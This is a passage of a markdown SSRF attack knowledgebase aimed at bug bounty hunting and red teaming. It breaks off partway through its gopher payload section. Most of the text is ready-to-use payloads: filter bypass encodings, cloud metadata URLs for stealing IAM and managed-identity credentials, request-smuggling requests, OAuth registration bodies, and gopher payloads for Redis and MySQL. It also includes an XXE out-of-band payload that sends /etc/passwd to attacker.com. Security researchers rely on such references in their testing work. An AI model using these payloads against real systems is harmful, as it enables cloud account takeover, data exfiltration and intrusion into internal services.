# SSRF (Server-Side Request Forgery) — Research-Grade Knowledgebase

> **Version:** 2026.05.23  
> **Scope:** Black-box bug bounty hunting, advanced red teaming, and automated SSRF detection.  
> **Sources:** PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, Assetnote Research, ProjectDiscovery, OWASP, and leading bug bounty writeups.

---

## Table of Contents

- [Basics](#basics)
- [SSRF Theory](#ssrf-theory)
- [URL Parser Internals](#url-parser-internals)
- [Blind SSRF](#blind-ssrf)
- [URL Validation Bypasses](#url-validation-bypasses)
- [Localhost Bypasses](#localhost-bypasses)
- [Internal Network Scanning](#internal-network-scanning)
- [Cloud Metadata Abuse](#cloud-metadata-abuse)
  - [AWS Metadata Payloads](#aws-metadata-payloads)
  - [GCP Metadata Payloads](#gcp-metadata-payloads)
  - [Azure Metadata Payloads](#azure-metadata-payloads)
- [DNS Rebinding Chains](#dns-rebinding-chains)
- [SSRF + Request Smuggling Chains](#ssrf--request-smuggling-chains)
- [SSRF + Open Redirect Chains](#ssrf--open-redirect-chains)
- [SSRF + Cache Poisoning Chains](#ssrf--cache-poisoning-chains)
- [SSRF + XXE Chains](#ssrf--xxe-chains)
- [SSRF + OAuth Exploitation Chains](#ssrf--oauth-exploitation-chains)
- [Protocol Smuggling Payloads](#protocol-smuggling-payloads)
  - [gopher:// Payloads](#gopher-payloads)
  - [file:// Payloads](#file-payloads)
  - [dict:// Payloads](#dict-payloads)
- [Redis Exploitation Chains](#redis-exploitation-chains)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability class where an attacker can induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

In a typical SSRF attack, the attacker might cause the server to connect to:
- Internal services within the organization's infrastructure
- External third-party systems (to exfiltrate data or trigger callbacks)
- Cloud metadata endpoints (AWS, GCP, Azure)
- Internal APIs that trust localhost/inner-network traffic

### Common Attack Vectors

| Feature | SSRF Risk |
|---------|-----------|
| Image proxy / thumbnail generator | High — fetches arbitrary URLs |
| Webhook validators | High — sends requests to user-supplied URLs |
| URL preview / unfurling | High — fetches arbitrary URLs |
| PDF / screenshot renderers | High — loads arbitrary URLs |
| File upload via URL | High — fetches remote file |
| API integrations | Medium — backend calls to user-supplied endpoints |
| SSRF via XML parsers (XXE) | High — external entity resolution |
| OAuth callback validation | Medium — redirect_uri manipulation |

### Top 25 SSRF Parameters (OWASP)

Based on frequency of use across bug bounty programs and automation tools:

```
dest, redirect, uri, path, continue, url, window, next, data,
reference, site, html, val, validate, domain, callback, return,
page, feed, host, port, to, out, view, dir
```

Also monitor headers:
```
Host, X-Forwarded-Host, X-Forwarded-For, X-Original-URL,
X-Rewrite-URL, Referer, Origin, X-Api-Url, X-Backend-Url
```

---

## SSRF Theory

### How SSRF Happens

1. **User input reaches a URL sink** — The application accepts user input (URL parameter, header, body field) and passes it to a library/function that makes an HTTP request.
2. **Insufficient validation** — The application fails to validate or sanitize the destination before making the request.
3. **Server executes the request** — The backend makes the request using its own network privileges, bypassing firewall rules and accessing internal resources.

### Impact Severity Matrix

| Scenario | Impact |
|----------|--------|
| Basic SSRF to internal admin panel | Information Disclosure / Unauthorized Access |
| SSRF to cloud metadata endpoint | Cloud Account Takeover |
| Blind SSRF with OOB interaction | Network mapping, internal recon |
| SSRF + Redis / internal DB | Data exfiltration, RCE |
| SSRF + Kubernetes API | Cluster compromise |
| SSRF + AWS IMDSv1 | IAM credential theft |

### Common Sinks by Language

**Python:**
```python
requests.get(user_input)          # requests
urllib.request.urlopen(user_input) # urllib
httpx.get(user_input)             # httpx
```

**Java:**
```java
URL url = new URL(userInput);
url.openConnection();             // java.net.URL
HttpClient.newBuilder().build().sendAsync(request); // java.net.http
```

**PHP:**
```php
file_get_contents($url);           # dangerous with wrappers
fopen($url, 'r');
curl_setopt($ch, CURLOPT_URL, $url);
```

**Node.js:**
```javascript
fetch(userInput);                  # native fetch
axios.get(userInput);              # axios
request(userInput);                # request
```

**Ruby:**
```ruby
open(user_input)                   # Kernel#open — extremely dangerous
Net::HTTP.get(URI(user_input))
```

**Go:**
```go
http.Get(userInput)                # net/http
client.Do(req)                     # custom client
```

---

## URL Parser Internals

### URL Parser Confusion

Different URL parsers (browser vs. server-side library) interpret the same URL differently. This is the root cause of many bypasses.

**Key components of a URL:**
```
scheme://[user[:password]@]host[:port]/path[?query][#fragment]
```

### Parser Differential Behaviors

| Component | curl/PHP | Python (urllib) | Java (java.net.URL) | Node.js (url.parse) | Browser (WHATWG) |
|-----------|----------|-----------------|---------------------|----------------------|------------------|
| `@` in path | Host = after last `@` | Host = after last `@` | Host = after last `@` | Host = after last `@` | Host = after last `@` |
| `\` handling | Treats as `/` | Treats as `/` | Treats as `/` | Treats as `/` | Treats as `/` |
| Multiple slashes | Collapses | Collapses | Collapses | Collapses | Collapses |
| Unicode | IDNA/punycode | IDNA/punycode | IDNA/punycode | IDNA/punycode | IDNA/punycode |
| `?` in userinfo | Varies | Varies | Varies | Varies | Varies |

### The `@` Trick (Authority Confusion)

The `@` character separates userinfo from host. Many parsers take the host as what comes after the **last** `@`:

```
http://evil.com@127.0.0.1
```

- **Browser sees:** host = `127.0.0.1` (navigates to localhost)
- **Some validators see:** host = `evil.com` (allows because evil.com is trusted)
- **Request goes to:** `127.0.0.1` (SSRF achieved)

Variations:
```
http://evil.com:80@127.0.0.1
http://evil.com@127.0.0.1:80
http://evil.com@127.0.0.1/path
https://evil.com@127.0.0.1#evil.com
```

### The `?` Trick in Userinfo

```
http://127.0.0.1?evil.com
```

Some parsers treat `127.0.0.1?evil.com` as the authority, then split on `?` to get host = `127.0.0.1`. Others may behave differently.

### Scheme Confusion

```
http://127.0.0.1 https://evil.com
```

Some parsers parse the first scheme and host, ignoring the rest. Others may treat the space as a separator.

### Unicode / IDN Homograph Attacks

```
http://xn--e1afmkfd.xn--p1ai   # Cyrillic domain that looks like ASCII
```

After punycode decoding, the browser shows what looks like a trusted domain, but the server-side parser may handle it differently.

### IPv6 Parsing Edge Cases

```
http://[::1]           # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6 loopback
http://[0:0:0:0:0:0:0:1]   # Expanded IPv6 loopback
```

**Critical Bug Pattern:** Some Rust parsers (e.g., `url` crate) return IPv6 with brackets `[::1]`, but validation logic compares against unbracketed `::1`. This mismatch allows bypass.

### Path-Traversal in URLs

```
http://trusted.com/../../internal
http://trusted.com/..%2f..%2finternal
http://trusted.com/%2e%2e/%2e%2e/internal
```

Some URL fetchers normalize path traversal after parsing the host, allowing access to internal resources on the same server.

---

## Blind SSRF

### What is Blind SSRF?

Blind SSRF occurs when the application makes a server-side request based on attacker input, but the response is **not returned to the attacker**. The attacker cannot directly see the response, making detection and exploitation harder.

### Detection Techniques for Blind SSRF

**1. Out-of-Band (OOB) Interaction:**
Use Burp Collaborator, Interactsh, or your own DNS/HTTP server to detect if the server makes a request.

```
?url=http://your-oast-domain.oast.pro
?url=http://your-burp-collaborator.net
```

**2. Time-Based Detection:**
If the application processes the response before returning, you can measure timing differences.

```
?url=http://127.0.0.1:22          # SSH port — likely timeout or fast reject
?url=http://127.0.0.1:8080        # Open port — faster response
?url=http://127.0.0.1:99999       # Invalid — immediate error
```

**3. DNS Interaction Only:**
Even if HTTP is blocked, DNS resolution may still occur.

```
?url=http://your-dns-server.com
```

Check if a DNS query was made to your server.

**4. Error-Based Detection:**
Trigger errors that leak information about the internal request.

```
?url=http://127.0.0.1:22
# Response: "Connection refused" or "SSH-2.0-OpenSSH..." in error
```

### Blind SSRF Exploitation Chains

**Chain 1: DNS Exfiltration**
```
?url=http://data-leaked-here.your-server.com
```

If the vulnerable server resolves the hostname and includes data in the subdomain, you can exfiltrate data via DNS queries.

**Chain 2: Time-Based Internal Port Scanning**
```
?url=http://127.0.0.1:§PORT§
```

Use Burp Intruder or ffuf with a port list. Measure response times:
- Fast response = port open / service responding
- Slow/timeout = port filtered or closed
- Error = port closed immediately

**Chain 3: HTTP Response Difference**
```
?url=http://127.0.0.1:80   → 200 OK
?url=http://127.0.0.1:81   → Connection refused error
```

Different error messages indicate port status.

**Chain 4: Protocol-Specific Fingerprints**
```
?url=http://127.0.0.1:22
# If error contains "SSH-2.0", you know SSH is running

?url=http://127.0.0.1:3306
# If error contains "mysql_native_password", MySQL is running
```

### Blind SSRF + Interactsh Workflow

```bash
# 1. Start interactsh client
interactsh-client

# 2. Use generated payload in SSRF parameter
?url=http://c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro

# 3. Poll for interactions
# DNS interaction = SSRF confirmed (at least DNS resolution)
# HTTP interaction = Full HTTP request possible
# SMTP interaction = Mail library SSRF possible
```

---

## URL Validation Bypasses

### Blacklist Bypass Techniques

When the application blocks specific strings (like `localhost`, `127.0.0.1`, `169.254.169.254`):

**1. Alternative IP Representations:**
```
# Decimal (no dots)
http://2130706433              # 127.0.0.1 in decimal
http://3232235521              # 192.168.0.1 in decimal
http://3232235777              # 192.168.1.1 in decimal
http://2886729728              # 172.16.0.0 in decimal
http://167772673               # 10.0.0.1 in decimal

# Octal
http://0177.0.0.1              # 127.0.0.1 in octal
http://0177.1                 # 127.0.0.1 short octal
http://0x7f.0.0.1             # 127.0.0.1 hex + decimal mix

# Hexadecimal
http://0x7f000001             # 127.0.0.1 in hex
http://0x7f.0.0.1             # Mixed hex
http://7f.0.0.1               # Partial hex (some parsers accept)

# Dotted hex
http://0x7f.0x00.0x00.0x01    # Full hex dotted

# Mixed representations
http://0177.1                 # Octal + decimal
http://0x7f.1                 # Hex + decimal
```

**2. IPv6 Representations:**
```
http://[::1]                  # IPv6 loopback
http://[::ffff:127.0.0.1]     # IPv4-mapped IPv6 loopback
http://[0:0:0:0:0:0:0:1]      # Expanded
http://[0000:0000:0000:0000:0000:0000:0000:0001]
http://[::ffff:7f00:1]        # Compact IPv4-mapped
```

**3. URL-Encoding:**
```
http://127.0.0.%31             # %31 = '1'
http://127.%30.0.1            # %30 = '0'
http://%31%32%37%2e%30%2e%30%2e%31  # Full encoded
http://127.0	.0.1            # Tab character
```

**4. Case Variations & Null Bytes:**
```
http://LOCALHOST
http://LocalHost
http://127.0.0.1%00evil.com   # Null byte (PHP/C-style parsers)
```

**5. Using Redirects:**
```
# Host a redirect on your server
# Response: HTTP/1.1 302 Found
# Location: http://127.0.0.1

?url=http://your-server.com/redirect-to-localhost
```

If the application follows redirects, the blacklist on the initial URL is bypassed.

**6. Using DNS Records:**
```
# Point a subdomain to 127.0.0.1
127.0.0.1.your-domain.com → A 127.0.0.1

?url=http://127.0.0.1.your-domain.com
```

**7. Using IDN / Punycode:**
```
http://xn--e1afmkfd.xn--p1ai  # May bypass ASCII-based filters
```

**8. Using Enclosed Alphanumerics:**
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ   # Some parsers normalize these
```

### Whitelist Bypass Techniques

When the application only allows specific domains/patterns:

**1. `@` Authority Confusion:**
```
http://allowed-domain.com@127.0.0.1
http://allowed-domain.com:80@127.0.0.1
http://allowed-domain.com@127.0.0.1:80
```

Validator sees `allowed-domain.com`, request goes to `127.0.0.1`.

**2. Path-Traversal with Whitelisted Domain:**
```
http://allowed-domain.com/../../internal
http://allowed-domain.com/..%2f..%2f169.254.169.254
```

**3. Fragment Identifier Abuse:**
```
http://127.0.0.1#allowed-domain.com
```

Some validators parse the fragment as part of the authority.

**4. Query String Abuse:**
```
http://127.0.0.1?allowed-domain.com
http://127.0.0.1/?q=allowed-domain.com
```

**5. Unicode Normalization Differences:**
```
http://allowed-domain.com.ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
```

**6. Using a Subdomain:**
```
http://allowed-domain.com.127.0.0.1.nip.io
```

If the validator checks if the domain "ends with" or "contains" the allowed domain, this bypasses.

**7. Double-Parsing Vulnerabilities:**
```
http://allowed-domain.com%2f@127.0.0.1
```

First parse sees `allowed-domain.com%2f@127.0.0.1` → host = `allowed-domain.com` (before %2f)
Second parse (after decode) sees `allowed-domain.com/@127.0.0.1` → host = `127.0.0.1`

### PortSwigger URL Validation Bypass Cheat Sheet Summary

```
# Bypassing "localhost" blacklist
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://0177.1
http://2130706433
http://0x7f000001
http://[::1]
http://[::ffff:127.0.0.1]

# Bypassing "127.0.0.1" blacklist
http://127.0.0.1.1
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://1.0.0.127.in-addr.arpa

# Bypassing "169.254.169.254" blacklist (AWS)
http://169.254.169.254.nip.io
http://169-254-169-254.nip.io
http://169.254.169.254.xip.io
http://2852039166                # decimal
http://0xa9fea9fe                # hex
http://[::ffff:169.254.169.254]  # IPv6 mapped
```

---

## Localhost Bypasses

### Direct Localhost Representations

```
http://localhost
http://127.0.0.1
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://::1
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:0:0:1]
```

### Obfuscated Localhost

```
http://2130706433              # decimal 127.0.0.1
http://0177.0.0.1              # octal
http://0177.1                  # short octal
http://0x7f.0.0.1              # hex mixed
http://0x7f000001              # full hex
http://2852039166              # decimal 169.254.169.254
http://0xa9fea9fe              # hex 169.254.169.254
http://2852039166.0            # decimal with .0 suffix (some parsers)
http://0x7f.0x00.0x00.0x01     # dotted hex
http://0x7f.1                  # hex + decimal
```

### DNS Rebinding to Localhost

Register a domain that first resolves to an external IP, then to `127.0.0.1` with TTL=1:
```
# First query: attacker.com → 203.0.113.1
# Second query (after TTL expires): attacker.com → 127.0.0.1
```

This bypasses "no private IP" validation if the validation happens at DNS resolution time.

### Using `xip.io` / `nip.io` Services

```
http://127.0.0.1.nip.io
http://192.168.1.1.nip.io
http://10.0.0.1.nip.io
http://169.254.169.254.nip.io
```

These services resolve `ANY-IP.nip.io` to `ANY-IP`. Useful for bypassing naive hostname checks.

### Using `in-addr.arpa`

```
http://1.0.0.127.in-addr.arpa   # Reverse DNS for 127.0.0.1
```

---

## Internal Network Scanning

### Basic Port Scanning via SSRF

**Time-Based Scanning:**
```
?url=http://127.0.0.1:§PORT§
```

Use Burp Intruder with:
- Payload: Numbers 1-65535
- Attack type: Sniper
- Detection: Response time differences, error messages

**Common Internal Ports:**
```
22   — SSH
80   — HTTP
443  — HTTPS
3306 — MySQL
5432 — PostgreSQL
6379 — Redis
27017 — MongoDB
9200 — Elasticsearch
8080 — Tomcat / Proxy
8443 — Alt HTTPS
3000 — Grafana / Dev
5000 — Flask / Dev
8000 — Django / Dev
9000 — PHP-FPM / Management
11211 — Memcached
2375 — Docker (unauthenticated)
2376 — Docker (TLS)
6443 — Kubernetes API
10250 — kubelet
10255 — kubelet read-only
```

### Internal IP Range Scanning

**RFC1918 Private Ranges:**
```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

**Common Internal IPs:**
```
192.168.1.1      — Router
192.168.0.1      — Router
10.0.0.1         — Router / Gateway
172.17.0.1       — Docker bridge
172.18.0.1       — Docker bridge custom
127.0.0.1        — Localhost
```

**Docker / Container IPs:**
```
172.17.0.0/16    — Default Docker bridge
172.18.0.0/16    — Custom Docker networks
172.19.0.0/16    — Custom Docker networks
10.244.0.0/16    — Kubernetes pod network (Flannel)
10.96.0.0/12     — Kubernetes service network
```

### Kubernetes Metadata Endpoints

```
http://169.254.169.254/latest/meta-data/     # AWS IMDS
http://169.254.170.2/v2/credentials/          # ECS task metadata
http://100.100.100.200/latest/meta-data/       # Alibaba Cloud
http://192.0.0.192/latest/                     # Oracle Cloud

# Kubernetes internal
http://kubernetes.default.svc.cluster.local
http://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/pods
```

### Scanning Automation

```bash
# Using ffuf for internal IP + port discovery
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ" \
     -w ports.txt:FUZZ \
     -mc all \
     -fr "error|timeout|refused"

# Using nuclei for SSRF-based scanning
nuclei -u https://target.com -t http/vulnerabilities/ssrf/
```

---

## Cloud Metadata Abuse

### Overview

Cloud metadata services are HTTP APIs exposed to instances at link-local addresses. They provide instance metadata, network config, and **temporary credentials**. SSRF to these endpoints is catastrophic.

**Common Metadata IPs:**
```
169.254.169.254  — AWS, Azure, GCP, DigitalOcean, Oracle, Alibaba
169.254.170.2    — AWS ECS task metadata
100.100.100.200  — Alibaba Cloud
192.0.0.192      — Oracle Cloud
```

### AWS Metadata Payloads

#### IMDSv1 (Instance Metadata Service v1)

**No authentication required. One request = credentials.**

```
# Step 1: Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials for the role
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Full chain:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**Other useful IMDSv1 endpoints:**
```
http://169.254.169.254/latest/meta-data/                    # All metadata
http://169.254.169.254/latest/meta-data/instance-id          # Instance ID
http://169.254.169.254/latest/meta-data/ami-id               # AMI ID
http://169.254.169.254/latest/meta-data/hostname             # Hostname
http://169.254.169.254/latest/meta-data/public-ipv4          # Public IP
http://169.254.169.254/latest/meta-data/local-ipv4           # Private IP
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key  # SSH key
http://169.254.169.254/latest/meta-data/iam/info             # IAM info
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance  # Alternative creds
http://169.254.169.254/latest/meta-data/user-data            # User data (often contains secrets!)
http://169.254.169.254/latest/meta-data/placement/region     # Region
http://169.254.169.254/latest/dynamic/instance-identity/document  # Instance identity document
```

#### IMDSv2 (Instance Metadata Service v2)

**Requires session token. Two-step process.**

```
# Step 1: Get token (PUT request with header)
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token in subsequent GET requests
curl -H "X-aws-ec2-metadata-token: TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

**IMDSv2 Bypass Scenarios:**
1. **IMDSv1 not disabled** — `HttpTokens` is `optional`, not `required`
2. **SSRF via redirects** — Application follows redirect to IMDS, PUT request originates from server
3. **Application-layer SSRF** — Application code itself can make PUT requests with custom headers
4. **HTTP Request Smuggling** — Inject `X-aws-ec2-metadata-token-ttl-seconds` header via smuggling

**Check if IMDSv1 is disabled:**
```bash
aws ec2 describe-instances --query "Reservations[*].Instances[*].MetadataOptions"
# Look for "HttpTokens": "required"
```

#### AWS ECS Task Metadata

```
# ECS tasks use a different endpoint
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Example:
http://169.254.170.2/v2/credentials/a1b2c3d4-1234-5678-abcd-1234567890ab
```

If environment variables are exposed (e.g., via SSTI, LFI, or info disclosure), combine with SSRF.

#### AWS Lambda

Lambda credentials are in environment variables:
```
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
```

SSRF that can read env vars (or SSTI evaluating `{{ env }}`) yields credentials without touching metadata endpoint.

### GCP Metadata Payloads

```
# GCP metadata endpoint (no auth header required for some endpoints)
http://169.254.169.254/computeMetadata/v1/

# Requires Metadata-Flavor: Google header (but some SSRF contexts can add headers)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://169.254.169.254/computeMetadata/v1/instance/name
http://169.254.169.254/computeMetadata/v1/instance/zone
http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip
http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/0/ip
```

**Note:** GCP requires `Metadata-Flavor: Google` header. If the SSRF allows header injection or the backend library adds it automatically, exploitation is possible.

### Azure Metadata Payloads

```
# Azure IMDS requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Managed Identity Token (requires Metadata: true header)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/

# Other Azure audiences to spray:
https://management.azure.com/
https://graph.microsoft.com/
https://vault.azure.net/
https://storage.azure.com/
https://database.windows.net/
https://api.botframework.azure.us/
https://digitaltwins.azure.net/
https://purview.azure.net/
https://api.timeseries.azure.com/
https://api.loganalytics.io/
https://api.azuredatalake.net/
https://api.fabric.microsoft.com/
https://api.powerbi.com/
https://api.azureml.ms/
https://api.cognitiveservices.azure.com/
https://api.openai.azure.com/
```

**Azure IMDS Architecture Notes:**
- IMDS issues tokens for **any valid audience URL**, regardless of permissions
- Authorization is enforced at the target service, not at IMDS
- 55+ audiences available from a single endpoint
- Token factory model: one compromised VM = keys to multiple kingdoms

### Other Cloud Providers

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/userdata
```

**Oracle Cloud:**
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

**OpenStack:**
```
http://169.254.169.254/openstack/latest/meta_data.json
```

**Hetzner:**
```
http://169.254.169.254/hetzner/v1/metadata
```

---

## DNS Rebinding Chains

### Theory

DNS Rebinding attacks exploit the time gap between DNS resolution and HTTP request execution. The attacker controls a DNS server that:
1. First resolves to a benign external IP (passes validation)
2. After TTL expires, resolves to an internal IP (bypasses validation)

### Attack Flow

```
1. Attacker registers evil.com with custom DNS server
2. Victim app validates evil.com → resolves to 203.0.113.1 (external, allowed)
3. App caches DNS result for TTL seconds (e.g., 1 second)
4. Attacker changes DNS record for evil.com → 127.0.0.1
5. App makes HTTP request to evil.com → now resolves to 127.0.0.1
6. SSRF achieved against internal target
```

### DNS Rebinding + SSRF to Cloud Metadata

```
# Phase 1: DNS resolves to attacker's server (external)
# Phase 2: After 1 second, DNS resolves to 169.254.169.254

?url=http://rebind.attacker.com/metadata
```

### Tools for DNS Rebinding

```bash
# Using dnsrebind.io or custom BIND server
# Configure low TTL (1 second) on A records

# Local testing with custom DNS:
dig @your-dns-server rebind.attacker.com
# First query: 203.0.113.1
# Wait 2 seconds
# Second query: 169.254.169.254
```

### Browser-Powered DNS Rebinding

Modern browsers cache DNS aggressively. DNS rebinding in browser context requires:
- Multiple DNS queries to bypass cache
- WebSocket or fetch API to force re-resolution
- Timing attacks to hit the window between TTL expiry and cache refresh

---

## SSRF + Request Smuggling Chains

### Theory

HTTP Request Smuggling (HRS) allows an attacker to prepend a smuggled request to the next legitimate request in a connection. When combined with SSRF:

1. The smuggled request can reach internal services behind reverse proxies
2. The smuggled request can inject headers (like IMDSv2 tokens)
3. The smuggled request can bypass WAFs that only inspect the initial request

### Attack Chain: HRS → SSRF → IMDSv2

```
# Smuggle a PUT request to get IMDSv2 token
POST /articles?source=http://attacker.com HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
Content-Length: 0

```

### CL.TE and TE.CL Variants

**CL.TE (Content-Length, Transfer-Encoding):**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**TE.CL (Transfer-Encoding, Content-Length):**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

6
SMUGGLE
0

```

### Practical SSRF + Smuggling Exploitation

```
# 1. Identify desync vector using HTTP Request Smuggler
python3 smuggler.py -u https://target.com

# 2. Craft smuggled SSRF payload
# The smuggled request targets internal metadata endpoint

# 3. Use Param Miner to find hidden parameters that accept URLs
python3 param-miner.py -u https://target.com --guess-params
```

### Browser-Powered Desync Attacks

James Kettle's research shows that browsers can be weaponized to desync connections:
- JavaScript can send requests that cause desync
- The browser's connection pool can be poisoned
- Subsequent requests from the browser (or other users) hit the smuggled endpoint

---

## SSRF + Open Redirect Chains

### Theory

If the application has an open redirect vulnerability and also makes server-side requests, the SSRF filter can be bypassed by:
1. Passing a trusted URL to the SSRF parameter
2. The trusted URL redirects to the internal target

### Attack Chain

```
# Step 1: Find open redirect on the same domain
https://target.com/redirect?url=http://evil.com

# Step 2: Chain with SSRF
?url=https://target.com/redirect?url=http://127.0.0.1

# The SSRF validator sees target.com (trusted)
# The backend follows redirect to 127.0.0.1
```

### PortSwigger Lab: SSRF via Open Redirect

```
# Application has stock check feature that fetches from internal API
# The internal API has an open redirect

POST /product/stock HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.68/admin
```

The `path` parameter causes an open redirect to the internal admin panel.

### Common Open Redirect Parameters

```
?next=, ?url=, ?redirect=, ?return=, ?redirect_uri=, ?callback=
```

---

## SSRF + Cache Poisoning Chains

### Theory

Web Cache Poisoning exploits the gap between how a cache and the origin server parse requests. Combined with SSRF:

1. Poison the cache with a request that causes the origin to make an SSRF
2. Other users hit the poisoned cache and trigger the SSRF
3. Or: Use SSRF to reach cache management endpoints

### Attack Chain: Cache Poisoning → SSRF

```
# 1. Find unkeyed input that reaches an SSRF sink
#    (e.g., X-Forwarded-Host header is unkeyed by cache)

GET /api/fetch?url=http://internal HTTP/1.1
Host: target.com
X-Forwarded-Host: internal-api.target.com

# 2. Cache stores response based on Host header (target.com)
#    But origin server uses X-Forwarded-Host for internal request
# 3. Other users get the poisoned response
```

### Web Cache Entanglement

When multiple URLs share a cache key due to normalization differences:
```
# Request A (attacker):
GET /api?url=http://attacker.com HTTP/1.1

# Request B (victim):
GET /api?url=http://internal.service HTTP/1.1

# If cache normalizes both to same key, A poisons B's response
```

---

## SSRF + XXE Chains

### Theory

XML External Entity (XXE) processing can force the server to fetch external DTDs or entities, effectively creating an SSRF channel.

### Basic XXE → SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Blind XXE → SSRF (OOB)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

**evil.dtd:**
```xml
<!ENTITY send SYSTEM "http://attacker.com/?data=%file;">
```

### XXE + SSRF to Internal APIs

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-api.local/admin">
]>
<request><data>&xxe;</data></request>
```

### XXE via SVG Upload

SVG files are XML and often processed by image libraries:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## SSRF + OAuth Exploitation Chains

### Theory

OAuth flows involve redirect URIs. If the OAuth client doesn't properly validate `redirect_uri`, an attacker can:
1. Steal authorization codes
2. Combine with SSRF to reach internal OAuth endpoints
3. Use SSRF to fetch tokens from internal token endpoints

### Hidden OAuth Attack Vectors (PortSwigger Research)

**1. Dynamic Client Registration SSRF:**
Some OAuth providers allow dynamic client registration. The `logo_uri`, `tos_uri`, or `policy_uri` fields may be fetched by the provider, creating SSRF.

```json
POST /register HTTP/1.1
Host: oauth-provider.com
Content-Type: application/json

{
  "redirect_uris": ["https://attacker.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/",
  "client_name": "test"
}
```

**2. SSRF via JWKS URI:**
```json
{
  "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**3. SSRF via Request URI (PAR — Pushed Authorization Requests):**
```
POST /as/par HTTP/1.1
Host: oauth-provider.com
Content-Type: application/x-www-form-urlencoded

request_uri=http://169.254.169.254/latest/meta-data/
```

**4. SSRF via Backchannel Logout:**
```json
{
  "backchannel_logout_uri": "http://169.254.169.254/latest/meta-data/"
}
```

---

## Protocol Smuggling Payloads

### gopher:// Payloads

The `gopher` protocol allows sending raw TCP data. Extremely powerful for attacking internal services.

**Gopher URL Structure:**
```
gopher://host:port/_DATA
```

The `_` is a placeholder for the gopher "type" and the rest is sent raw over TCP.

**Gopher → HTTP (Raw Request):**
```
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
```

**Gopher → Redis:**
```
gopher://127.0.0.1:6379/_SET%20key%20value%0D%0A
```

**Gopher → MySQL:**
```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%00%00
```

**Gopher → SMTP:**
```
